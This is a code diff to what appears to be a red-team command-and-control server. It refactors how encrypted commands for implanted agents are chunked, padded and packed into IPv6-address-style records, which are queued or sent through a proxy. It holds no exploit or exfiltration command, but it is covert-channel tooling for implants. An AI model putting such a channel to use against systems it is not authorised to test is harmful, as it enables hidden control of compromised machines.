@@ -2,7 +2,7 @@ import * as crypto from "crypto";
 import * as path from "path";
 import ECKey from "ec-key";
 
-import { Config, Constants, emsg, padTail, padZero } from "../utils/utils";
+import { chunkString, Config, Constants, emsg, padZero } from "../utils/utils";
 import Crypto, { CipherModel, KeyExportType } from "./crypto";
 import Logger from "./logger";
 import SkimmerModule, { SkimmerModuleConfig as SkimmerModuleConfig } from "../modules/skimmer";
@@ -294,100 +294,71 @@ export default class RedChannel {
             commandProtoBuffer = this.encryptPayload(commandProtoBuffer, agent.secret);
         }
 
-        const dataBlocks = commandProtoBuffer.toString("hex").match(/[a-f0-9]{1,4}/g);
-        if (!dataBlocks) throw new Error("invalid encrypted payload");
+        // this will be set to false after keyx is received and there are no more keyx in sendq
+        if (command === implant.AgentCommand.AGENT_KEYX) agent.allowKeyx = true;
 
-        // prettier-ignore
-        const totalIps =
-            Math.floor(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP) +
-            Math.min(1, dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP);
+        const dataString = commandProtoBuffer.toString("hex");
+        const dataBlocks = chunkString(dataString, Config.DATA_BLOCK_STRING_LENGTH);
 
-        // prettier-ignore
-        const totalCommands =
-            Math.floor(totalIps / Config.MAX_IPS_PER_COMMAND) +
-            Math.min(1, totalIps % Config.MAX_IPS_PER_COMMAND);
+        const totalIps = Math.ceil(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP);
+        const totalSendqEntries = Math.ceil(totalIps / Config.MAX_DATA_IPS_PER_SENDQ_ENTRY);
+
+        const dataLength = dataString.length;
+        const maxDataLength = Config.DATA_BLOCK_STRING_LENGTH * Config.MAX_DATA_BLOCKS_PER_IP * totalIps;
+        const paddedBytesNeeded = (maxDataLength - dataLength) / 2;
 
         const dataId = crypto.randomBytes(2).toString("hex");
 
-        let ips: string[] = [];
-        let paddedBytes = 0;
-        for (let ipNum = 0; ipNum < totalIps; ipNum++) {
-            const blocksPerIp = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);
-
-            // pad the last block with trailing Fs
-            const lastAddedBlock = blocksPerIp.slice(-1)[0];
-            paddedBytes = 4 - lastAddedBlock.length;
-            blocksPerIp[blocksPerIp.length - 1] = padTail(lastAddedBlock, 4);
-            if (blocksPerIp.length < Config.MAX_DATA_BLOCKS_PER_IP) {
-                const blocksNeeded = Config.MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
-                for (let j = 0; j < blocksNeeded; j++) {
-                    blocksPerIp.push(Config.DATA_PAD_CHAR.repeat(4));
-                    paddedBytes += 4;
-                }
-            }
-            if (paddedBytes > 0) {
-                paddedBytes = paddedBytes / 2; // agent assumes bytes not hex strings
-            }
-
+        for (let sendqEntryNum = 0; sendqEntryNum < totalSendqEntries; sendqEntryNum++) {
+            let ips: string[] = [];
+            // add sendq entry header
             // prettier-ignore
             ips.push(
-                Config.IP_DATA_PREFIX +
-                ':' +
-                padZero(ipNum.toString(16), 4) +
-                ':' +
-                blocksPerIp.join(':')
-            );
-
-            // add the header record to the top of the array
-            if (totalCommands > 1 && (ips.length === Config.MAX_IPS_PER_COMMAND - 1 || ipNum === totalIps - 1)) {
-                // prettier-ignore
-                ips.unshift(
-                    Config.IP_HEADER_PREFIX +
-                    ':' +
-                    dataId +
-                    ':' +
-                    padZero(command.toString(16), 2) +
-                    padZero(paddedBytes.toString(16), 2) +
-                    ':' +
-                    padZero(totalIps.toString(16), 4) +
-                    ':' +
-                    '0000:0000:0000:0001'
-                );
-
-                agent.sendq.push(ips);
-                ips = [];
-            }
-        }
-        if (totalCommands === 1) {
-            // prettier-ignore
-            ips.unshift(
                 Config.IP_HEADER_PREFIX +
                 ':' +
                 dataId +
                 ':' +
                 padZero(command.toString(16), 2) +
-                padZero(paddedBytes.toString(16), 2) +
+                padZero(paddedBytesNeeded.toString(16), 2) +
                 ':' +
                 padZero(totalIps.toString(16), 4) +
                 ':' +
                 '0000:0000:0000:0001'
             );
-        }
 
-        // set to false after keyx is received and there are no more keyx in sendq
-        if (command === implant.AgentCommand.AGENT_KEYX) agent.allowKeyx = true;
+            for (let ipNum = 0; ipNum < Config.MAX_DATA_IPS_PER_SENDQ_ENTRY; ipNum++) {
+                let blocks = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);
+                if (blocks.length === 0) break;
 
-        if (ips.length > 0) {
-            agent.sendq?.push(ips);
+                // if we don't fill up the entire ip with data
+                // it means we have to pad
+                const maxBlockStringLength = Config.MAX_DATA_BLOCKS_PER_IP * Config.DATA_BLOCK_STRING_LENGTH;
+                const blocksString = blocks.join("");
+                if (blocksString.length < maxBlockStringLength) {
+                    const blocksStringPadded = `${blocksString}${Config.DATA_PAD_HEXBYTE.repeat(paddedBytesNeeded)}`;
+                    blocks = chunkString(blocksStringPadded, Config.DATA_BLOCK_STRING_LENGTH);
+                }
+
+                const recordNumber = ipNum + Config.MAX_DATA_IPS_PER_SENDQ_ENTRY * sendqEntryNum;
+                // prettier-ignore
+                ips.push(
+                    Config.IP_DATA_PREFIX +
+                    ':' +
+                    padZero(recordNumber.toString(16), 4) +
+                    ':' +
+                    blocks.join(':')
+                );
+            }
+
             if (this.modules.proxy.config.enabled && agent.channel === AgentChannel.PROXY) {
                 await this.modules.proxy.sendToProxy(agent.id, ips);
-
-                // cleanup sendq if proxying to agent
-                agent.sendq = [];
+            } else {
+                agent.sendq.push(ips);
             }
+            this.log.debug(`queued up ${ips.length} records: ${JSON.stringify(ips, null, 2)}`);
+            ips = [];
         }
-        this.log.debug(`queued up ${totalIps} records in ${totalCommands} command(s) for agent: ${agentId}`);
-        this.log.debug(`records: ${JSON.stringify(ips, null, 2)}`);
+        this.log.debug(`added ${totalIps} records in ${totalSendqEntries} sendq entries for agent: ${agentId}`);
     }
 
     isCommandInSendQ(agentId: string, command: implant.AgentCommand) {
